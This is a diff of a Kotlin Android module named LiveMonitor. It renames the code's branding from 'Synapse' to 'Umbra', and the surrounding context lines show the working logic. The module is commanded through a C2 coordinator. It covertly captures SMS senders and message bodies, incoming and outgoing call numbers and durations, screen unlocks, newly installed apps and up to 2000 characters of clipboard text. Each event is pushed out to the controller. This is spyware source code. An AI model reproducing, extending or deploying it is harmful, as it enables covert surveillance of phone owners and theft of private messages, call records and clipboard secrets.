@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.BroadcastReceiver
 import android.content.ClipboardManager
@@ -22,13 +22,13 @@ import kotlinx.coroutines.cancel
 import kotlinx.coroutines.launch
 import kotlinx.serialization.encodeToString
 import kotlinx.serialization.json.Json
-import org.synapse.core.c2.C2Coordinator
-import org.synapse.core.c2.Command
-import org.synapse.core.core.ResponseEnvelope
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.C2Coordinator
+import org.umbra.core.c2.Command
+import org.umbra.core.core.ResponseEnvelope
+import org.umbra.core.core.UmbraResponse
 
 object LiveMonitor {
-    private const val TAG = "Synapse.LiveMonitor"
+    private const val TAG = "Umbra.LiveMonitor"
 
     private val json = Json { ignoreUnknownKeys = true; encodeDefaults = false }
 
@@ -46,7 +46,7 @@ object LiveMonitor {
     // ── Observer / listener handles ─────────────────────────────────────
 
     private var smsObserver: SmsContentObserver? = null
-    private var phoneListener: SynapsePhoneListener? = null
+    private var phoneListener: UmbraPhoneListener? = null
     private var screenReceiver: ScreenUnlockReceiver? = null
     private var packageReceiver: PackageInstallReceiver? = null
     private var clipListener: ClipboardChangeListener? = null
@@ -61,7 +61,7 @@ object LiveMonitor {
     //  COMMANDS
     // ═══════════════════════════════════════════════════════════════════
 
-    fun start(ctx: Context, cmd: Command): SynapseResponse {
+    fun start(ctx: Context, cmd: Command): UmbraResponse {
         appContext = ctx.applicationContext
         scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
@@ -72,13 +72,13 @@ object LiveMonitor {
         startClipboardMonitor()
 
         Log.d(TAG, "All live monitors started")
-        return SynapseResponse.LiveStatusResponse(
+        return UmbraResponse.LiveStatusResponse(
             status = "started",
             monitors = getActiveMonitors()
         )
     }
 
-    fun stop(ctx: Context, cmd: Command): SynapseResponse {
+    fun stop(ctx: Context, cmd: Command): UmbraResponse {
         stopSmsMonitor()
         stopCallMonitor()
         stopScreenMonitor()
@@ -90,16 +90,16 @@ object LiveMonitor {
         appContext = null
 
         Log.d(TAG, "All live monitors stopped")
-        return SynapseResponse.LiveStatusResponse(
+        return UmbraResponse.LiveStatusResponse(
             status = "stopped",
             monitors = emptyMap()
         )
     }
 
-    fun status(cmd: Command): SynapseResponse {
+    fun status(cmd: Command): UmbraResponse {
         val monitors = getActiveMonitors()
         val anyActive = monitors.values.any { it }
-        return SynapseResponse.LiveStatusResponse(
+        return UmbraResponse.LiveStatusResponse(
             status = if (anyActive) "running" else "idle",
             monitors = monitors
         )
@@ -109,7 +109,7 @@ object LiveMonitor {
     //  PUSH HELPER
     // ═══════════════════════════════════════════════════════════════════
 
-    private fun push(response: SynapseResponse) {
+    private fun push(response: UmbraResponse) {
         scope?.launch {
             try {
                 val envelope = ResponseEnvelope(
@@ -197,7 +197,7 @@ object LiveMonitor {
                         val date = if (dateIdx >= 0) it.getLong(dateIdx) else 0L
 
                         if (address.isNotBlank()) {
-                            push(SynapseResponse.LiveEventResponse(
+                            push(UmbraResponse.LiveEventResponse(
                                 event_type = if (isIncoming) "sms_received" else "sms_sent",
                                 sms_address = address,
                                 sms_body = body,
@@ -224,7 +224,7 @@ object LiveMonitor {
 
         try {
             val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-            phoneListener = SynapsePhoneListener()
+            phoneListener = UmbraPhoneListener()
             tm.listen(phoneListener, PhoneStateListener.LISTEN_CALL_STATE)
             callMonitorActive = true
             Log.d(TAG, "Call monitor active")
@@ -246,7 +246,7 @@ object LiveMonitor {
         Log.d(TAG, "Call monitor stopped")
     }
 
-    private class SynapsePhoneListener : PhoneStateListener() {
+    private class UmbraPhoneListener : PhoneStateListener() {
         override fun onCallStateChanged(state: Int, phoneNumber: String?) {
             super.onCallStateChanged(state, phoneNumber)
             val number = phoneNumber ?: ""
@@ -255,7 +255,7 @@ object LiveMonitor {
                 TelephonyManager.CALL_STATE_RINGING -> {
                     lastCallNumber = number
                     lastCallState = state
-                    push(SynapseResponse.LiveEventResponse(
+                    push(UmbraResponse.LiveEventResponse(
                         event_type = "call_ringing",
                         call_number = number
                     ))
@@ -265,7 +265,7 @@ object LiveMonitor {
                     lastCallNumber = if (lastCallNumber.isEmpty() && number.isNotEmpty()) number else lastCallNumber
                     callStartTime = System.currentTimeMillis()
                     lastCallState = state
-                    push(SynapseResponse.LiveEventResponse(
+                    push(UmbraResponse.LiveEventResponse(
                         event_type = "call_offhook",
                         call_number = lastCallNumber
                     ))
@@ -276,7 +276,7 @@ object LiveMonitor {
                         val duration = if (callStartTime > 0) {
                             (System.currentTimeMillis() - callStartTime) / 1000
                         } else 0L
-                        push(SynapseResponse.LiveEventResponse(
+                        push(UmbraResponse.LiveEventResponse(
                             event_type = "call_idle",
                             call_number = lastCallNumber,
                             call_duration = duration
@@ -322,14 +322,14 @@ object LiveMonitor {
             val action = intent?.action ?: return
             when (action) {
                 Intent.ACTION_USER_PRESENT -> {
-                    push(SynapseResponse.LiveEventResponse(
+                    push(UmbraResponse.LiveEventResponse(
                         event_type = "user_present",
                         screen_action = "unlock"
                     ))
                     Log.d(TAG, "Screen unlocked")
                 }
                 Intent.ACTION_SCREEN_ON -> {
-                    push(SynapseResponse.LiveEventResponse(
+                    push(UmbraResponse.LiveEventResponse(
                         event_type = "screen_on",
                         screen_action = "on"
                     ))
@@ -382,7 +382,7 @@ object LiveMonitor {
                 packageName
             }
 
-            push(SynapseResponse.LiveEventResponse(
+            push(UmbraResponse.LiveEventResponse(
                 event_type = "package_added",
                 package_name = packageName,
                 app_name = appName
@@ -447,7 +447,7 @@ object LiveMonitor {
                 val maxLen = 2000
                 val truncated = if (text.length > maxLen) text.take(maxLen) + "..." else text
 
-                push(SynapseResponse.LiveEventResponse(
+                push(UmbraResponse.LiveEventResponse(
                     event_type = "clipboard_changed",
                     clipboard_text = truncated,
                     clipboard_mime = mimeType
